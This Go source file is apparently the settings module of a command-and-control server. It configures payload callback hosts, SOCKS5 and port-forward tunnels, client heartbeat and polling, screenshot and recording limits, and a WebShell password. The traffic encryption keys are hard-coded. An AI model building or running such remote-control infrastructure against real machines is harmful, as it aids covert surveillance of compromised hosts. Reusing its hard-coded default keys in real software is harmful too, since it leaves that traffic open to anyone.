package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
)

// ============ config.json 文件配置（web ip/port/protocol 等不再存数据库）============

// WebConfig config.json 中 web 段
type WebConfig struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Protocol string `json:"protocol"`
	SslCert  string `json:"ssl_cert"`
	SslKey   string `json:"ssl_key"`
}

// FileConfig config.json 根结构
type FileConfig struct {
	Web WebConfig `json:"web"`
}

// 全局 config.json 缓存（启动时加载一次，运行时只读）
var (
	fileConfig     FileConfig
	fileConfigOnce sync.Once
	fileConfigErr  error
)

// loadFileConfig 加载根目录 config.json
// 查找顺序: serverDir/config.json → projectRoot/config.json → wd/config.json
func loadFileConfig() (FileConfig, error) {
	fileConfigOnce.Do(func() {
		// 候选路径
		candidates := []string{
			filepath.Join(projectRoot, "config.json"),
			filepath.Join(serverDir, "config.json"),
		}
		if wd, err := os.Getwd(); err == nil {
			candidates = append(candidates, filepath.Join(wd, "config.json"))
		}

		var foundPath string
		for _, p := range candidates {
			if fileExists(p) {
				foundPath = p
				break
			}
		}

		if foundPath == "" {
			// config.json 不存在，使用默认值
			fileConfig = FileConfig{
				Web: WebConfig{
					Host:     "0.0.0.0",
					Port:     5000,
					Protocol: "http",
				},
			}
			return
		}

		data, err := os.ReadFile(foundPath)
		if err != nil {
			fileConfigErr = err
			return
		}
		if err := json.Unmarshal(data, &fileConfig); err != nil {
			fileConfigErr = fmt.Errorf("config.json 解析失败: %w", err)
			return
		}
		// 默认值兜底
		if fileConfig.Web.Host == "" {
			fileConfig.Web.Host = "0.0.0.0"
		}
		if fileConfig.Web.Port <= 0 || fileConfig.Web.Port > 65535 {
			fileConfig.Web.Port = 5000
		}
		p := strings.ToLower(fileConfig.Web.Protocol)
		if p == "" {
			p = "http"
		}
		fileConfig.Web.Protocol = p
	})
	return fileConfig, fileConfigErr
}

// reloadFileConfig 重新加载 config.json（用于配置页面"刷新文件配置"按钮）
func reloadFileConfig() (FileConfig, error) {
	fileConfigOnce = sync.Once{}
	return loadFileConfig()
}

// ============ 配置管理（与 app.py DEFAULT_SETTINGS 对齐）============

// DEFAULT_SETTINGS 配置项默认值（首次启动自动写入，不覆盖已存在的值）
var DEFAULT_SETTINGS = map[string]string{
	// 通信监听参数
	"listen_host":            "0.0.0.0",
	"callback_host":          "",
	"listen_port":            "5000",
	"listen_protocol":        "http",
	"ssl_cert":               "",
	"ssl_key":                "",
	"client_listen_port":     "8443",
	"tunnel_port_forward":    "8888",
	"tunnel_socks5_port":     "1080",
	"tunnel_http_proxy_port": "8080",
	// 通信加密（默认密码与 client-go/config.go、payload_gen.go 保持一致）
	"traffic_encryption":   "aes-128-cbc",
	"traffic_enc_password": "C2DemoKey2024!!!",
	"traffic_aes_key":      "C2DemoKey2024!!!",
	"traffic_xor_key":      "c2demo",
	// 客户端行为参数
	"client_heartbeat_interval": "5",
	"client_task_poll_interval": "3",
	"client_offline_timeout":    "60",
	"client_reconnect_max":      "30",
	// 任务执行限制
	"screenshot_max_resolution": "1080p",
	"record_max_duration":       "60",
	"file_upload_max_mb":        "50",
	// 安全策略
	"session_timeout":      "86400",
	"max_login_attempts":   "5",
	"login_lock_minutes":   "15",
	// Webhook
	"webhook_enabled": "false",
	"webhook_url":     "",
	"webhook_events":  "login,client_online,payload,task",
}

// 配置缓存（避免频繁查库）
var (
	settingsCache   = map[string]string{}
	settingsCacheMu sync.RWMutex
)

// ensureDefaultSettings 首次启动时写入默认配置（不覆盖已存在的值）
func ensureDefaultSettings() {
	for k, v := range DEFAULT_SETTINGS {
		if getSetting(k) == "" {
			setSetting(k, v)
		}
	}
}

// getSetting 读取配置项
func getSetting(key string) string {
	// 先查缓存
	settingsCacheMu.RLock()
	if v, ok := settingsCache[key]; ok {
		settingsCacheMu.RUnlock()
		return v
	}
	settingsCacheMu.RUnlock()
	// 查库
	m, _ := queryOne("SELECT value FROM settings WHERE key=?", key)
	if m == nil {
		return ""
	}
	v := getString(m, "value", "")
	// 写入缓存
	settingsCacheMu.Lock()
	settingsCache[key] = v
	settingsCacheMu.Unlock()
	return v
}

// getSettingDefault 读取配置项，空则返回默认值
func getSettingDefault(key, def string) string {
	v := getSetting(key)
	if v == "" {
		return def
	}
	return v
}

// setSetting 写入配置项（INSERT OR REPLACE）
func setSetting(key, value string) {
	dbExec("INSERT OR REPLACE INTO settings (key, value, updated_at) VALUES (?, ?, ?)", key, value, nowLocal())
	// 更新缓存
	settingsCacheMu.Lock()
	settingsCache[key] = value
	settingsCacheMu.Unlock()
}

// refreshSettingsCache 刷新配置缓存（配置变更后调用）
func refreshSettingsCache() {
	settingsCacheMu.Lock()
	settingsCache = map[string]string{}
	settingsCacheMu.Unlock()
}

// ============ 加密配置管理（与 app.py _load_encryption_config 对齐）============

var (
	encAlgo     = "none"
	encPassword = "C2DemoKey2024!!!"
	encMu       sync.RWMutex
)

// loadEncryptionConfig 从配置管理加载加密算法和密码
func loadEncryptionConfig() (string, string) {
	algo := getSettingDefault("traffic_encryption", "aes-128-cbc")
	password := getSettingDefault("traffic_enc_password", "C2DemoKey2024!!!")
	// 兼容旧值映射: aes → aes-128-cbc
	if algo == "aes" {
		algo = "aes-128-cbc"
	}
	encMu.Lock()
	encAlgo = algo
	if password != "" {
		encPassword = password
	} else {
		encPassword = "C2DemoKey2024!!!"
	}
	encMu.Unlock()
	return algo, encPassword
}

// getEncAlgo 获取当前加密算法
func getEncAlgo() string {
	encMu.RLock()
	defer encMu.RUnlock()
	return encAlgo
}

// getEncPassword 获取当前加密密码
func getEncPassword() string {
	encMu.RLock()
	defer encMu.RUnlock()
	return encPassword
}

// setEncryptionConfig 临时设置加密配置（WebShell 独立密码场景）
func setEncryptionConfig(algo, password string) {
	encMu.Lock()
	encAlgo = strings.ToLower(algo)
	if password != "" {
		encPassword = password
	}
	encMu.Unlock()
}

// ============ 网络工具（与 app.py get_local_ip 对齐）============

// getLocalIP 获取本机局域网 IP（优先非 127.x/虚拟网卡）
func getLocalIP() string {
	// 方法1: UDP socket 获取出口 IP
	if conn, err := net.Dial("udp", "192.168.0.1:80"); err == nil {
		defer conn.Close()
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			ip := addr.IP.String()
			if ip != "" && !strings.HasPrefix(ip, "127.") {
				return ip
			}
		}
	}
	// 方法2: 遍历网卡
	if ifaces, err := net.Interfaces(); err == nil {
		for _, ifc := range ifaces {
			if ifc.Flags&net.FlagLoopback != 0 || ifc.Flags&net.FlagUp == 0 {
				continue
			}
			addrs, _ := ifc.Addrs()
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				ip4 := ip.To4()
				if ip4 != nil {
					return ip4.String()
				}
			}
		}
	}
	return "127.0.0.1"
}

// getCallbackHost 获取 Payload 回连地址（优先级: callback_host > listen_host(非0.0.0.0) > 本机IP）
func getCallbackHost() string {
	cb := getSetting("callback_host")
	if cb != "" {
		return cb
	}
	lh := getSetting("listen_host")
	if lh != "" && lh != "0.0.0.0" {
		return lh
	}
	return getLocalIP()
}

// getEffectiveHost 获取显示用监听地址（0.0.0.0 显示为 127.0.0.1）
func getEffectiveHost() string {
	h := getSettingDefault("listen_host", "0.0.0.0")
	if h == "0.0.0.0" {
		return "127.0.0.1"
	}
	return h
}

// fmtPort 格式化端口号
func fmtPort(s string) string {
	if s == "" {
		return "5000"
	}
	return s
}

// getListenPort 获取监听端口（优先 config.json，回退数据库）
func getListenPort() string {
	cfg, _ := loadFileConfig()
	if cfg.Web.Port > 0 && cfg.Web.Port <= 65535 {
		return strconv.Itoa(cfg.Web.Port)
	}
	return getSettingDefault("listen_port", "5000")
}

// getListenProtocol 获取监听协议（优先 config.json，回退数据库）
func getListenProtocol() string {
	cfg, _ := loadFileConfig()
	if cfg.Web.Protocol != "" {
		return strings.ToLower(cfg.Web.Protocol)
	}
	return strings.ToLower(getSettingDefault("listen_protocol", "http"))
}

// getListenHost 获取监听地址（优先 config.json，回退数据库）
func getListenHost() string {
	cfg, _ := loadFileConfig()
	if cfg.Web.Host != "" {
		return cfg.Web.Host
	}
	return getSettingDefault("listen_host", "0.0.0.0")
}

// getSSLCert 获取 SSL 证书路径（优先 config.json，回退数据库）
func getSSLCert() string {
	cfg, _ := loadFileConfig()
	if cfg.Web.SslCert != "" {
		return cfg.Web.SslCert
	}
	return getSetting("ssl_cert")
}

// getSSLKey 获取 SSL 私钥路径（优先 config.json，回退数据库）
func getSSLKey() string {
	cfg, _ := loadFileConfig()
	if cfg.Web.SslKey != "" {
		return cfg.Web.SslKey
	}
	return getSetting("ssl_key")
}

// getClientListenPort 获取客户端监听端口
func getClientListenPort() string {
	return getSettingDefault("client_listen_port", "8443")
}

// getTunnelPort 获取隧道端口
func getTunnelPort(tunnelType string) string {
	switch tunnelType {
	case "forward":
		return getSettingDefault("tunnel_port_forward", "8888")
	case "socks5":
		return getSettingDefault("tunnel_socks5_port", "1080")
	case "http":
		return getSettingDefault("tunnel_http_proxy_port", "8080")
	}
	return ""
}

// getAllSettings 获取全部配置，分类嵌套返回（与 app.py get_all_settings 对齐）
// 前端 _settingsData.listen / .encryption / .client / .limits / .security / .webhook 直接读取
// 注意: web host/port/protocol/ssl_cert/ssl_key 来自 config.json 文件，不再存数据库
func getAllSettings() map[string]interface{} {
	// web 配置从 config.json 读取
	cfg, _ := loadFileConfig()
	listenHost := cfg.Web.Host
	listenPort := strconv.Itoa(cfg.Web.Port)
	listenProto := cfg.Web.Protocol
	sslCert := cfg.Web.SslCert
	sslKey := cfg.Web.SslKey

	callbackHost := getSetting("callback_host")
	// callback_host 为空时自动检测本机 IP（优先级: callback_host > listen_host(非0.0.0.0) > 本机IP）
	effectiveCallback := callbackHost
	if effectiveCallback == "" {
		if listenHost != "0.0.0.0" {
			effectiveCallback = listenHost
		} else {
			effectiveCallback = getLocalIP()
		}
	}
	localIP := getLocalIP()

	listen := map[string]interface{}{
		"host":                    listenHost,
		"callback_host":           callbackHost,
		"effective_callback_host": effectiveCallback,
		"detected_local_ip":       localIP,
		"port":                    listenPort,
		"protocol":                listenProto,
		"ssl_cert":                sslCert,
		"ssl_key":                 sslKey,
		"running_host":            listenHost,
		"running_port":            listenPort,
		"client_listen_port":      getSettingDefault("client_listen_port", "8443"),
		"tunnel_port_forward":     getSettingDefault("tunnel_port_forward", "8888"),
		"tunnel_socks5_port":      getSettingDefault("tunnel_socks5_port", "1080"),
		"tunnel_http_proxy_port":  getSettingDefault("tunnel_http_proxy_port", "8080"),
		// 标记 web 核心配置来源为 config.json 文件（前端用于只读显示）
		"config_from_file":        true,
	}
	encryption := map[string]interface{}{
		"algorithm": getSettingDefault("traffic_encryption", "aes-128-cbc"),
		"password":  getSettingDefault("traffic_enc_password", "c2_demo_key_2024"),
		"aes_key":   getSettingDefault("traffic_aes_key", "C2DemoKey2024!!!"),
		"xor_key":   getSettingDefault("traffic_xor_key", "c2demo"),
	}
	client := map[string]interface{}{
		"heartbeat_interval": atoiDefault(getSettingDefault("client_heartbeat_interval", "5"), 5),
		"task_poll_interval": atoiDefault(getSettingDefault("client_task_poll_interval", "3"), 3),
		"offline_timeout":    atoiDefault(getSettingDefault("client_offline_timeout", "60"), 60),
		"reconnect_max":      atoiDefault(getSettingDefault("client_reconnect_max", "30"), 30),
	}
	limits := map[string]interface{}{
		"screenshot_max_resolution": getSettingDefault("screenshot_max_resolution", "1080p"),
		"record_max_duration":       atoiDefault(getSettingDefault("record_max_duration", "60"), 60),
		"file_upload_max_mb":        atoiDefault(getSettingDefault("file_upload_max_mb", "50"), 50),
	}
	security := map[string]interface{}{
		"session_timeout":     atoiDefault(getSettingDefault("session_timeout", "86400"), 86400),
		"max_login_attempts":  atoiDefault(getSettingDefault("max_login_attempts", "5"), 5),
		"login_lock_minutes":  atoiDefault(getSettingDefault("login_lock_minutes", "15"), 15),
	}
	webhook := map[string]interface{}{
		"enabled": getSettingDefault("webhook_enabled", "false") == "true",
		"url":     getSetting("webhook_url"),
		"events":  getSettingDefault("webhook_events", "login,client_online,payload,task"),
	}
	return map[string]interface{}{
		"listen":     listen,
		"encryption": encryption,
		"client":     client,
		"limits":     limits,
		"security":   security,
		"webhook":    webhook,
	}
}

// atoiDefault 字符串转 int，失败返回默认值
func atoiDefault(s string, def int) int {
	n, err := strconv.Atoi(strings.TrimSpace(s))
	if err != nil {
		return def
	}
	return n
}

// ifaceToString 将任意类型转为字符串（配置保存用，处理 JSON 解析后的 string/float64/bool）
func ifaceToString(v interface{}) string {
	if v == nil {
		return ""
	}
	switch x := v.(type) {
	case string:
		return x
	case float64:
		// 整数值去掉小数部分（JSON 数字解析后是 float64，端口/间隔等整数不应带 .0）
		if x == float64(int64(x)) {
			return strconv.FormatInt(int64(x), 10)
		}
		return strconv.FormatFloat(x, 'f', -1, 64)
	case bool:
		if x {
			return "true"
		}
		return "false"
	case int:
		return strconv.Itoa(x)
	case int64:
		return strconv.FormatInt(x, 10)
	default:
		return fmt.Sprintf("%v", v)
	}
}

// getSettingsInfo 获取配置概览信息（启动时显示）
func getSettingsInfo() map[string]interface{} {
	return map[string]interface{}{
		"host":              getListenHost(),
		"callback_host":     getCallbackHost(),
		"port":              getListenPort(),
		"protocol":          getListenProtocol(),
		"running_host":      getListenHost(),
		"running_port":      getListenPort(),
		"client_listen_port": getClientListenPort(),
	}
}

// sanitizeSettingsValue 清理配置值（防止注入）
func sanitizeSettingsValue(v string) string {
	v = strings.TrimSpace(v)
	// 限制长度
	if len(v) > 1024 {
		v = v[:1024]
	}
	return v
}

// validatePort 校验端口
func validatePort(port string) bool {
	if port == "" {
		return false
	}
	n := 0
	for _, c := range port {
		if c < '0' || c > '9' {
			return false
		}
		n = n*10 + int(c-'0')
	}
	return n > 0 && n <= 65535
}

// portConflictCheck 端口冲突校验（Web/客户端/隧道端口互不相同）
func portConflictCheck(web, client, forward, socks5, http string) error {
	ports := map[string]string{
		"Web后台":   web,
		"客户端监听": client,
		"端口转发":   forward,
		"SOCKS5":  socks5,
		"HTTP代理": http,
	}
	seen := map[string]string{}
	for name, p := range ports {
		if p == "" {
			continue
		}
		if prev, ok := seen[p]; ok {
			return fmt.Errorf("端口冲突: %s 与 %s 都使用 %s", name, prev, p)
		}
		seen[p] = name
	}
	return nil
}
